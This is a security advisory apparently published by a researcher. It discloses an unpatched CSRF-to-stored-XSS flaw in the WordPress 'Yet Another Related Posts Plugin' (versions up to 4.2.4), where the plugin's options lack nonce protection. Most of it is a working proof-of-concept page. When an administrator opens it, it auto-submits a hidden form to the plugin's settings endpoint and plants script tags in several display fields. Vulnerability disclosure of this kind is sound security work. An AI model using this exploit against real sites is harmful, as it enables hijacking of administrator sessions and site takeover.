Affected Versions <= 4.2.4 Description &#039;Yet Another Related Posts Plugin&#039;
options can be updated with no token/nonce protection which an attacker may
exploit via tricking website&#039;s administrator to enter a malformed page
which will change YARPP options, and since some options allow html the
attacker is able to inject malformed javascript code which can lead to *code
execution/administrator actions* when the injected code is triggered by an
admin user.
injected javascript code is triggered on any post page. Vulnerability Scope
XSS
RCE ( http://research.evex.pw/?vuln=14 ) Authorization Required None Proof
of Concept
 
<body onload="document.getElementById(&#039;payload_form&#039;).submit()" >
  <form id="payload_form"
action="http://wpsite.com/wp-admin/options-general.php?page=yarpp"
method="POST" >
    <input type=&#039;hidden&#039; name=&#039;recent_number&#039; value=&#039;12&#039; >
    <input type=&#039;hidden&#039; name=&#039;recent_units&#039; value=&#039;month&#039; >
    <input type=&#039;hidden&#039; name=&#039;threshold&#039; value=&#039;5&#039; >
    <input type=&#039;hidden&#039; name=&#039;weight[title]&#039; value=&#039;no&#039; >
    <input type=&#039;hidden&#039; name=&#039;weight[body]&#039; value=&#039;no&#039; >
    <input type=&#039;hidden&#039; name=&#039;tax[category]&#039; value=&#039;no&#039; >
    <input type=&#039;hidden&#039; name=&#039;tax[post_tag]&#039; value=&#039;consider&#039; >
    <input type=&#039;hidden&#039; name=&#039;auto_display_post_types[post]&#039; value=&#039;on&#039; >
    <input type=&#039;hidden&#039; name=&#039;auto_display_post_types[page]&#039; value=&#039;on&#039; >
    <input type=&#039;hidden&#039; name=&#039;auto_display_post_types[attachment]&#039; value=&#039;on&#039; >
    <input type=&#039;hidden&#039; name=&#039;auto_display_archive&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;limit&#039; value=&#039;1&#039; >
    <input type=&#039;hidden&#039; name=&#039;use_template&#039; value=&#039;builtin&#039; >
    <input type=&#039;hidden&#039; name=&#039;thumbnails_heading&#039; value=&#039;Related posts:&#039; >
    <input type=&#039;hidden&#039; name=&#039;no_results&#039; value=&#039;<script>alert(1);</script>&#039; >
    <input type=&#039;hidden&#039; name=&#039;before_related&#039;
value=&#039;<script>alert(1);</script><li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;after_related&#039; value=&#039;</li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;before_title&#039;
value=&#039;<script>alert(1);</script><li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;after_title&#039; value=&#039;</li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;show_excerpt&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;excerpt_length&#039; value=&#039;10&#039; >
    <input type=&#039;hidden&#039; name=&#039;before_post&#039; value=&#039;+<small>&#039; >
    <input type=&#039;hidden&#039; name=&#039;after_post&#039; value=&#039;</small>&#039; >
    <input type=&#039;hidden&#039; name=&#039;order&#039; value=&#039;post_date ASC&#039; >
    <input type=&#039;hidden&#039; name=&#039;promote_yarpp&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_display&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_limit&#039; value=&#039;1&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_use_template&#039; value=&#039;builtin&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_thumbnails_heading&#039; value=&#039;Related posts:&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_no_results&#039; value=&#039;No Results&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_before_related&#039; value=&#039;<li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_after_related&#039; value=&#039;</li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_before_title&#039; value=&#039;<li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_after_title&#039; value=&#039;</li>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_show_excerpt&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_excerpt_length&#039; value=&#039;10&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_before_post&#039; value=&#039;+<small>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_after_post&#039; value=&#039;</small>&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_order&#039; value=&#039;score DESC&#039; >
    <input type=&#039;hidden&#039; name=&#039;rss_promote_yarpp&#039; value=&#039;true&#039; >
    <input type=&#039;hidden&#039; name=&#039;update_yarpp&#039; value=&#039;Save Changes&#039; >
  </form></body>
 
Fix No Fix Available at The Moment. Timeline Notified Vendor - No Reply
Notified Vendor Again- No Reply
Publish Disclosure
 
@Evex_1337
http://research.evex.pw/?vuln=15

